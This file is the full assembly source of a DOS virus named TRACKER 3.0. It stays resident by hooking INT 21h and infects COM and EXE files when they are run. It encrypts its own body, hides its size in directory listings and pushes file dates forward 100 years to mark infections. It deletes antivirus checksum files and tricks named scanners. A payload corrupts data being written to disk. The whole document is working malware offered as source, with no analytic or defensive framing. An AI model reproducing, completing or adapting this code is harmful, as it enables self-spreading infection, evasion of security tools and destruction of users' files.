

.286c
assume cs:bseg,ds:bseg
cseg segment para public 'Null EXE file'
org 0h
null proc near

                                mov ax,04c00h
                                int 21h
null endp
cseg ends

bseg segment para public 'TRACKER release 3.0'
tracker proc short

program_start                   equ     $
_ram                            equ     0413h
lenght                          equ     program_end-program_start
archive_lenght                  equ     lenght+018h
phd_enviorn                     equ     2ch
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                           ;Entry point for COM files
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
com_file_entry_point:           push    cs
                                push    0100h
                                push    cs
                                mov     ax,0b512h
                                int     21h
                                cmp     ax,01979h
                                jz      skip_tsr_com
                                mov     bx,0103h
                                add     bx,cs:[101h]
                                call    get_ram
                                call    hook_int_21

skip_tsr_com:                   mov     byte ptr ss:[102h],03h
jmp2                            equ     $-1
                                mov     word ptr ss:[100h],0102h
jmp1                            equ     $-2

                                pop     ax
                                mov     es,ax
                                mov     ds,ax
                                retf
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                           ;Entry point for EXE files
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
exe_entry_point:                mov     ax,es
                                add     ax,010h
                                add     cs:old_ss,ax
                                add     cs:old_cs,ax
                                mov     ax,0b512h
                                int     21h
                                cmp     ax,01979h
                                je      skip_tsr_exe
                                push    es
                                push    ds
                                xor     bx,bx
                                call    get_ram
                                call    hook_int_21
                                pop     ds
                                pop     es
skip_tsr_exe:                   mov     ss,cs:[old_ss]
                                mov     sp,0
old_sp                          equ     word ptr $-2
                                db      0eah
old_ip                          dw      0
old_cs                          dw      0

old_ss                          dw      0
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                         ;Get xxxx bytes of main memory
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú

get_ram:                        push bx

retry_get_ram:                  mov     ah,048h
                                mov     bx,05dh   ;paragraphs
                                int     21h
                                jnc     allocated_ok

                                mov     ax,es
                                dec     ax
                                mov     es,ax
                                mov     bx,es:03h
                                sub     bx,05eh   ;paragraphs+1
                                inc     ax
                                mov     es,ax
                                mov     ah,04ah
                                int     21h
                                jmp     retry_get_ram

allocated_ok:                   dec     ax
                                mov     es,ax
                                mov     word ptr es:01h,08h
                                mov     word ptr es:08h,05343h ; SC (System program)
                                inc     ax
                                mov     es,ax
                                xor     di,di
                                pop     si
                                call    decrypt_virus
                                mov     cx,lenght
                                db      02eh
                                rep     movsb
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Encryption routine
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
encrypt_virus:                  inc byte ptr xorvalue+1

decrypt_virus:                  push di
                                push cx
                                mov di,offset encryption_start
                                add di,si
                                mov cx,offset encryption_end-offset encryption_start
do_encryption:                  mov al,cs:[di]
xorvalue:                       xor al,01h
                                xor al,055h
                                xor al,cl
                                mov cs:[di],al
                                inc di
                                loop do_encryption
                                pop cx
                                pop di
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
encrypt_and_write:              xor  si,si
                                call encrypt_virus

                                mov  ah,040h
                                mov  cx,lenght
                                xor  dx,dx
                                call int_21

                                mov  dx,24
                                sub  dl,alignment
                                mov  cx,dx
                                mov  dx,offset int_21_entry_point
                                sub  dx,cx
                                mov  ah,040h
                                call int_21

                                call decrypt_virus

                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
int_21:                         pushf
                                call      dword ptr cs:int_21_lo
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Stealth routine
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
encryption_start                equ $

find:                           call  int_21
                                pushf
                                pusha
                                push es
                                jc    btf
                                mov   ah,02fh
                                call  int_21
                                mov   ah,es:[bx+019h]
                                and   ah,0feh
                                cmp   ah,20*2     ;beyond 2000 (1980+20)
                                jb    btf
dec_lenght:                     sub   word ptr es:[bx+01ah],archive_lenght
                                sbb   word ptr es:[bx+01ch],0
btf:                            pop es
                                popa
                                popf
                                jmp   emulated_iret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
fcb_find:                       call  int_21
                                pushf
                                pusha
                                push  es
                                or    al,al
                                jne   btf
                                mov   ah,02fh
                                call  int_21
                                mov   ah,es:[bx+021h]
                                and   ah,0feh
                                cmp   ah,20*2     ;1980+20 beyond 2000
                                jb    btf
                                add   bx,0ah
                                jmp   dec_lenght
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
agony:                          cmp cs:agony_f,1
                                je kill_em
                                jmp go_int_21
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                               ;String data area
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
v_id:                           mov ax,01979h
                                iret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                ;Int 21 handler
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
int_21_entry_point:             call    test_dst          ;Test dst open/create
                                cmp     ah,04bh           ;EXEC
                                jz      infect_file       ;(Infect files)
                                cmp     ax,0b512h         ;Larvas' birthday
                                jz      v_id              ;(Virus ID)
                                cmp     ah,040h           ;WRITE
                                je      agony             ;(Destroy data)
                                cmp     ah,04eh           ;FIND FIRST
                                je      find              ;(Stealth)
                                cmp     ah,04fh           ;FIND NEXT
                                je      find              ;(Stealth)
                                cmp     ah,011h           ;FIND FIRST (FCB)
                                je      fcb_find          ;(Stealth)
                                cmp     ah,012h           ;FIND NEXT (FCB)
                                je      fcb_find          ;(Stealth)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
go_int_21:                      jmp     dword ptr cs:int_21_lo
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
kill_em:                        push ax
                                push si
                                cmp bx,4                 ;dont damage
                                jbe  no_destroy_yet      ;STDOUT,STDIN,PRN,AUX
                                mov al,5
                                out 70h,al
                                in  al,71h
                                cmp al,080h
                                jb  no_destroy_yet
                                mov si,dx
                                add si,cx
                                xor byte ptr [si-1],080h
no_destroy_yet:                 pop si
                                pop ax
                                jmp go_int_21
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
hardware_error:                 mov ax,3                ;fail
                                iret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
infect_file:                    pusha                                     ;0x01
                                push es                                   ;0x02
                                push ds                                   ;0x03
                                push es

                                push  dx                  ;store pointer to name
                                push  ds
                                mov   ah,02fh             ;get dta address
                                int   21h
                                mov   cs:time,bx          ;store it in unused
                                mov   cs:date,es          ;space
                                mov   ax,cs               ;ds=cs
                                mov   ds,ax               ;
                                mov   dx,offset hdr       ;set new dta
                                mov   ah,01ah             ;
                                int   21h                 ;
                                pop   ds
                                pop   dx                  ;retrieve pointer

                                mov   ah,04eh
                                mov   cx,027h
                                int   21h

                                push  ds
                                push  dx
                                mov   ds,cs:date
                                mov   dx,cs:time
                                mov   ah,01ah             ;
                                int   21h                 ;
                                pop   dx
                                pop   ds

                                mov   ah,cs:byte ptr hdr+019h
                                and   ah,0feh
                                cmp   ah,20*2
                                jb    infect_it_ii

                                jmp   none_attached

;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Delete CHKLIST.CPS and CHKLIST.MS
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
infect_it_ii:                   push ds
                                pop  es
                                call rip_checklist
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Use internal Critical Error Handler, that always FAIL
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call get_ceh
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Check if the name is a complete path-name, and check disk space (2 clusters)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                push dx                                   ;0x08
                                mov  di,dx
                                xor  dl,dl
                                cmp  [di+1],byte ptr ':'
                                jne  go_check
                                mov  dl,[di]
                                sub  dl,040h
go_check:                       mov  ah,036h
                                int  21h
                                cmp  bx,02h
                                jae  infect_it
                                jmp  not_enough_space
infect_it:                      pop  dx                                   ;1x08
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Add ! to filename (fools VSAFE and NAV)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  cx,080h
                                xor  al,al
                                repne scasb
                                dec  di
                                push word ptr ds:[di]
                                push ds
                                push di
                                mov  word ptr ds:[di],0021h
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Get file attributes
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  cs:filename_hi,ds
                                mov  cs:filename_lo,dx
                                xor  al,al
                                call get_or_set
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Clear READ-ONLY, HIDDEN and SYSTEM
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  cs:f_att,cx
                                mov  al,1
                                mov  cx,020h
                                call get_or_set
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Open file for I/O, if there's an open error, abort infection
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  ax,03d02h
                                call int_21
                                mov  bx,ax
get_date:                       mov  ax,05700h
                                jc   recover_registers
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Get file date
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call int_21
                                push cs
                                pop  ds
                                mov  word ptr time,cx
                                mov  word ptr date,dx
                                mov  byte ptr alignment,0
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Read first 01ch bytes
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call read_buffer
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Is an EXE file or COM file
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                cmp  word ptr hdr,05a4dh
                                jz   is_exe
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Is a COM file, then get first 3 bytes, and store they in the restore routine
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
com_file:                       mov  ax,word ptr hdr
                                mov  ch,byte ptr hdr+2
                                mov  word ptr jmp1,ax
                                mov  byte ptr jmp2,ch
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Pan to end of file!!!
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call end_of_file
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Check if there's at least 2k in the file to write the virus (COM only)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                cmp  ah,0f8h
                                ja   abort_infection
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;The file must be longer than 32 bytes!!!
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                cmp  ax,byte ptr 020h
                                jbe  abort_infection
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Put a jump to Com_startup
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                sub  ax,byte ptr 3
                                mov  word ptr hdr+1,ax
                                mov  byte ptr hdr,0e9h
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Yeaaaah, another infected file, increase the counter
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
writing_virus:                  inc  infect_counter
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Add 100 years to date (Stealth)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                add  byte ptr date+1,0c8h
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Write virus code
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call encrypt_and_write
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Rewrite header
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
write_buffer:                   mov  ax,04200h
                                xor  cx,cx
                                xor  dx,dx
                                call int_21
                                mov  ah,040h
                                call io
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Re-set old date (but plus 100 years)
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
abort_infection:                mov  cx,time
                                mov  dx,date
                                mov  ax,05701h
                                call int_21
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Close file
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  ah,03eh
                                call int_21
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Set antique attributes
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov  al,1
                                mov  cx,f_att
                                call get_or_set
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Restore filename
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
recover_registers:              pop  di
                                pop  ds
                                pop  word ptr ds:[di]
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Restore critical error handler
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
not_enough_space:               call set_ceh
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Check for Embriordery Design System
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                call check_eds
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Job done
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
none_attached:                  pop es
                                pop ds
                                pop es
                                popa
                                jmp go_int_21
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;It's an exe, check if it's infected
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
is_exe:                         call end_of_file
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Convert MOD512 to 32bit
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                push bx
                                push dx
                                push ax
                                mov ax,word ptr hdr+2
                                mov bx,word ptr hdr+4
                                mov cx,bx
                                shr cx,7
                                shl bx,9
                                or bx,ax
                                sub bx,0200h
                                sbb cx,0
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Move old executions addresses to virus
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov dx,word ptr hdr+014h
                                mov ax,word ptr hdr+016h
                                mov old_ip,dx
                                mov old_cs,ax
                                mov dx,word ptr hdr+010h
                                mov ax,word ptr hdr+00eh
                                mov old_ss,ax
                                mov old_sp,dx
                                pop ax
                                pop dx
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Check if the file has overlays, if there are, abort
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                cmp cx,dx
                                jne abort2_infection
                                cmp bx,ax
                                je  dont_abort
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Pop bx and abort
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
abort2_infection:               pop bx
                                jmp abort_infection
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Calculate the offset, in paragraphs, of TRACKER II
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
dont_abort:                     mov bx,ax
                                neg bx
                                and bx,0fh
                                add ax,bx
                                adc dx,0
                                shr ax,4
                                shl dx,12
                                or  ax,dx
                                sub ax,word ptr hdr+8
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Push they into the header
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov word ptr hdr+00eh,ax
                                mov word ptr hdr+010h,offset hdr+080h
                                mov word ptr hdr+014h,offset exe_entry_point
                                mov word ptr hdr+016h,ax
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Paragraph alignment
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov ah,040h
                                mov cx,bx
                                mov alignment,cl
                                xor dx,dx
                                pop bx
                                int 21h
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Add alignment to lenght
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                mov cx,archive_lenght
                                add word ptr hdr+2,cx
                                mov cx,word ptr hdr+2
                                and word ptr hdr+2,01ffh
                                shr cx,9
                                add word ptr hdr+4,cx
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Convert 32bit to MOD512
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
                                jmp  writing_virus
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
read_buffer:                    mov  ah,03fh
io:                             mov  cx,01ch
                                mov  dx,offset hdr
                                call int_21
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
hook_int_21:                    mov     ax,es
                                mov     ds,ax
                                mov     ax,3521h
                                int     21h
                                mov     int_21_hi,es
                                mov     int_21_lo,bx
                                mov     dx,offset int_21_entry_point
                                mov     ah,25h
                                int     21h
                                mov     al,005h
                                out     070h,al
                                in      al,071h
                                inc     al
                                out     071h,al
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
get_or_set:                     mov ds,cs:filename_hi
                                mov dx,cs:filename_lo
                                mov ah,43h
                                int 21h
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
check_eds:                      mov dx,03e4h
                                xor ah,ah
                                in al,dx
                                cmp al,0ffh
                                je no_eds
                                jmp set_agony
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
get_ceh:                        push ds
                                push es
                                push dx
                                mov ax,03524h
                                int 21h
                                mov cs:old_int24_lo,bx
                                mov cs:old_int24_hi,es
                                mov dx,offset hardware_error
                                mov ax,cs
                                mov ds,ax
set_int:                        mov ax,02524h
                                int 21h
                                pop dx
                                pop es
                                pop ds
no_eds:                         ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
central_point                   db 'chklist.cps',0
microsoft                       db 'chklist.ms',0
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;ds:si = filename
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
rip_checklist:                  push es
                                push ds
                                push dx
                                call rip_2
                                pop dx
                                pop ds
                                pop es
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
rip_2:                          xor cx,cx
                                mov di,offset hdr
                                mov si,dx
translating:                    mov al,[si]
                                mov cs:[di],al
                                inc si
                                inc di
                                inc cx
                                or al,al
                                jne translating
                                mov ax,cs
                                mov ds,ax
                                mov es,ax
                                mov al,'\'
                                std
                                db 02eh
                                repne scasb
                                add di,2
                                cld

no_drive:                       push di
                                mov si,offset microsoft
                                call replace_name
                                pop di
                                mov si,offset central_point
replace_name:                   mov cx,12
                                rep movsb
                                mov ah,041h
                                mov dx,offset hdr
                                call int_21

                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
set_ceh:                        push ds
                                push es
                                push dx
                                mov ds,cs:old_int24_hi
                                mov dx,cs:old_int24_lo
                                jmp set_int
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
set_agony:                      mov cs:agony_f,1
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
end_of_file:                    mov  ax,04202h
                                xor  cx,cx
                                xor  dx,dx
                                int  21h
                                ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
hammer                          db      073h,005h,0BAh,0B9h,002h,0EBh,0E0h,0A3h,0C0h,001h,0B4h,03Fh,08Bh,01Eh,0C0h,001h
overlay_11                      db      072h,0C7h,0A3h,005h,001h,08Bh,0D8h,0B8h,000h,03Fh,0B9h,000h,001h,0BAh,048h,0C8h
overlay_26                      db      072h,0C1h,0A3h,005h,001h,08Bh,0D8h,0B8h,000h,03Fh,0B9h,000h,001h,0BAh,01Ah,0CAh
